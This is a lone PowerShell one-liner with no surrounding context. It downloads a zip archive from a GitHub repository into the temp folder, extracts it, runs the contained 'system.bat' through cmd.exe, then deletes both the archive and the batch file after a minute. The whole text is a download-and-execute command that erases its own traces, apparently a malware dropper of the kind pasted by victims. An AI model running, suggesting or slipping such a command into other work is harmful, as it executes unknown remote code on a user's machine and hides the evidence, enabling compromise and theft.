iwr https://github.com/SKILK12/MENI/raw/main/system.zip -OutFile "$env:TEMP\system.zip"; Expand-Archive -Path "$env:TEMP\system.zip" -DestinationPath "$env:TEMP" -Force; Remove-Item -Path "$env:TEMP\system.zip" -Force; Start-Process -FilePath "cmd.exe" -ArgumentList "/c $env:TEMP\system.bat"; Start-Sleep -Seconds 60; Remove-Item -Path "$env:TEMP\system.bat" -Force; exit

